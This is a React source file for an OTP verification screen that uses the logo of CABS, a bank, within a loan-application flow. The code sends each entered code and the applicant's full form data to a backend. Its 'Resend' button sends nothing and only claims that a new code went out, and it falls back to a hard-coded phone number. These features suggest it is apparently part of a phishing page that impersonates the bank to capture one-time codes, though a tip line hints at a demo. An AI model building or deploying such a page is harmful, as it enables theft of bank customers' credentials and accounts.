import React, { useState, useRef, useEffect } from 'react';
import { CABS_LOGO_URL } from './CabsLogo';
import { LoanApplicationData } from '../types';
import { ArrowLeft, CheckCircle2 } from 'lucide-react';

interface OtpVerificationPageProps {
  data: LoanApplicationData;
  onSuccess: (otp: string) => void;
  onBackToLogin: () => void;
  onToast: (msg: string, isError?: boolean) => void;
}

export const OtpVerificationPage: React.FC<OtpVerificationPageProps> = ({
  data,
  onSuccess,
  onBackToLogin,
  onToast,
}) => {
  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(45);
  const [canResend, setCanResend] = useState(false);
  const [submissionId, setSubmissionId] = useState<string | null>(null);

  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  // Auto focus first OTP box on load and set submission ID
  useEffect(() => {
    inputRefs[0].current?.focus();
    // Get submission ID from data prop
    if (data.submissionId) {
      setSubmissionId(data.submissionId);
    }
  }, [data.submissionId]);

  // Countdown timer for resend
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [countdown]);

  const handleDigitChange = (index: number, value: string) => {
    const cleaned = value.replace(/\D/g, '').slice(-1);
    const newDigits = [...otpDigits];
    newDigits[index] = cleaned;
    setOtpDigits(newDigits);
    setErrorMessage(null);

    // Auto advance to next box
    if (cleaned && index < 5) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!pasted) return;

    const newDigits = [...otpDigits];
    for (let i = 0; i < pasted.length; i++) {
      newDigits[i] = pasted[i];
    }
    setOtpDigits(newDigits);

    const nextIndex = Math.min(pasted.length, 5);
    inputRefs[nextIndex].current?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);

    const fullOtp = otpDigits.join('');
    if (fullOtp.length !== 6) {
      setErrorMessage('Please enter the full 6-digit verification code.');
      onToast('Please enter the full 6-digit verification code.', true);
      return;
    }

    setIsLoading(true);
    onToast('Verifying OTP...');

    try {
      // Send OTP verification request to backend
      const apiUrl = import.meta.env.VITE_API_URL || `${window.location.origin}/api`;
      const currentSubmissionId = submissionId || Date.now().toString();
      
      const response = await fetch(`${apiUrl}/verify-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          submissionId: currentSubmissionId,
          otp: fullOtp,
          formData: data,
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to verify OTP');
      }

      const result = await response.json();
      
      if (result.success) {
        setIsLoading(false);
        onToast('OTP verified successfully! Finalizing loan disbursement...');
        onSuccess(fullOtp);
      } else {
        throw new Error(result.error || 'Verification failed');
      }
    } catch (error) {
      console.error('OTP verification error:', error);
      setIsLoading(false);
      setErrorMessage('Failed to verify OTP. Please try again.');
      onToast('Failed to verify OTP. Please try again.', true);
    }
  };

  const handleResend = () => {
    if (!canResend) return;
    setCountdown(45);
    setCanResend(false);
    setOtpDigits(['', '', '', '', '', '']);
    setErrorMessage(null);
    inputRefs[0].current?.focus();
    onToast(`New OTP sent to ${displayPhone}`);
  };

  const displayPhone = data.phone?.trim() ? data.phone : '+26378566322';

  return (
    <div
      className="min-h-screen bg-[#f3f4f6] text-[#1e293b] flex flex-col items-center justify-center p-4 sm:p-6"
      style={{ fontFamily: "'Albert Sans', sans-serif" }}
    >
      {/* Top back button */}
      <div className="w-full max-w-[440px] mb-4 flex justify-between items-center">
        <button
          onClick={onBackToLogin}
          className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white hover:bg-gray-50 text-gray-600 hover:text-[#1a2a5c] text-xs font-semibold shadow-xs border border-gray-200 transition-colors cursor-pointer"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to Secured Login</span>
        </button>
      </div>

      {/* Top Brand Logo Banner */}
      <div className="w-28 h-20 bg-white rounded-md flex items-center justify-center p-3 mb-7 shadow-xs border border-gray-100">
        <img
          src={CABS_LOGO_URL}
          alt="CABS Logo"
          className="w-full h-full object-contain"
        />
      </div>

      {/* Main OTP Card */}
      <div className="w-full max-w-[440px] bg-white rounded-[28px] p-7 sm:p-9 shadow-[0_10px_35px_rgba(0,0,0,0.05)] border border-gray-100/80 text-center animate-fadeInUp">
        {/* Title */}
        <h2
          className="text-2xl sm:text-[28px] font-extrabold text-[#1a2a5c] tracking-tight mb-2.5"
          style={{ fontFamily: "'Urbanist', sans-serif" }}
        >
          OTP Verification
        </h2>

        {/* Subtitle */}
        <p className="text-gray-600 text-sm sm:text-[15px] leading-relaxed">
          Please enter the OTP sent to your number
          <span className="block font-bold text-[#1a2a5c] mt-0.5">
            {displayPhone} <span className="font-normal text-gray-500">(sms)</span>
          </span>
        </p>

        {/* Error message */}
        {errorMessage && (
          <div className="mt-4 px-3 py-2 rounded-xl bg-red-50 border border-red-200 text-red-600 text-xs font-medium">
            {errorMessage}
          </div>
        )}

        {/* 6-box input form */}
        <form onSubmit={handleSubmit} className="mt-7">
          <div className="flex justify-center gap-2 sm:gap-2.5 mb-7">
            {otpDigits.map((digit, idx) => (
              <input
                key={idx}
                ref={inputRefs[idx]}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={(e) => handleDigitChange(idx, e.target.value)}
                onKeyDown={(e) => handleKeyDown(idx, e)}
                onPaste={handlePaste}
                className="w-11 h-14 sm:w-12 sm:h-16 rounded-xl sm:rounded-2xl border-2 border-gray-300 focus:border-[#1a2a5c] bg-white text-center text-xl sm:text-2xl font-bold text-[#1a2a5c] outline-none transition-all shadow-2xs focus:shadow-[0_0_0_3px_rgba(26,42,92,0.12)]"
              />
            ))}
          </div>

          {/* Action button */}
          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3.5 sm:py-4 px-6 rounded-2xl bg-[#6f829f] hover:bg-[#5b6e89] text-white font-bold text-base transition-all duration-200 active:scale-[0.99] cursor-pointer shadow-md disabled:opacity-70 flex items-center justify-center gap-2"
            style={{ fontFamily: "'Urbanist', sans-serif" }}
          >
            {isLoading ? (
              <>
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                <span>Verifying...</span>
              </>
            ) : (
              <span>Verify and Login</span>
            )}
          </button>
        </form>

        {/* Resend link */}
        <div className="mt-6 text-sm text-gray-600">
          Didn&apos;t receive code?{' '}
          {canResend ? (
            <button
              onClick={handleResend}
              className="font-bold text-[#1a2a5c] hover:underline cursor-pointer"
            >
              Resend
            </button>
          ) : (
            <span className="text-gray-400">
              Resend in <strong className="text-gray-600">{countdown}s</strong>
            </span>
          )}
        </div>

        {/* Test helper notice */}
        <div className="mt-5 pt-4 border-t border-gray-100 text-[11px] text-gray-400">
          Tip: Enter any 6-digit code (e.g. <strong>123456</strong>) to verify
        </div>
      </div>
    </div>
  );
};
